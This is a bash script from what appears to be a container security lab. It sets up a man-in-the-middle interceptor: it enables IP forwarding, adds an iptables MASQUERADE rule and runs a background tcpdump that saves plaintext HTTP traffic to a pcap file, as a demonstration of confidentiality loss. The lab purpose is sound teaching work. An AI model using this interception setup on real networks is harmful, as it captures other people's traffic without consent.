#!/bin/bash
# Threat 4 (MitM) — turn mitm-interceptor into an on-path interceptor. Run INSIDE it.
#
# The interceptor is the client's gateway (a hijacked route). It forwards client traffic to
# the target (MASQUERADE so replies return through it) and CAPTURES the plaintext in transit
# -> demonstrates that an on-path attacker can read the traffic (confidentiality loss).
#
# mitmproxy is not packaged on Debian trixie; passive capture (tcpdump) reliably proves the
# READ capability. Active modification would additionally need a transparent proxy
# (mitmproxy on the Kali container) — noted in the README.
set -e
export DEBIAN_FRONTEND=noninteractive
command -v tcpdump >/dev/null || { apt-get update -qq && apt-get install -y -qq tcpdump iptables procps iproute2 >/dev/null; }

EXT=eth0   # incus-default side (towards apache)
INT=eth1   # mitm-net side (from client)

# incus Debian images only auto-configure eth0; bring up the mitm-net NIC manually
ip addr show dev $INT | grep -q 10.66.0.2 || ip addr add 10.66.0.2/24 dev $INT
ip link set $INT up

sysctl -n net.ipv4.ip_forward > /tmp/mitm_ipforward.orig 2>/dev/null || echo 0 > /tmp/mitm_ipforward.orig
sysctl -w net.ipv4.ip_forward=1 >/dev/null
iptables -t nat -C POSTROUTING -o $EXT -j MASQUERADE 2>/dev/null || iptables -t nat -A POSTROUTING -o $EXT -j MASQUERADE

# capture the forwarded HTTP in transit (proof of read-interception)
pkill -f "tcpdump.*mitm-capture" 2>/dev/null || true; sleep 1
setsid bash -c "tcpdump -i $EXT -n -A -s0 'tcp port 80' -w /root/mitm-capture.pcap > /dev/null 2>&1 < /dev/null" &
sleep 2
echo "ip_forward=$(sysctl -n net.ipv4.ip_forward); MASQUERADE set; tcpdump: $(pgrep -f mitm-capture >/dev/null && echo capturing || echo down)"
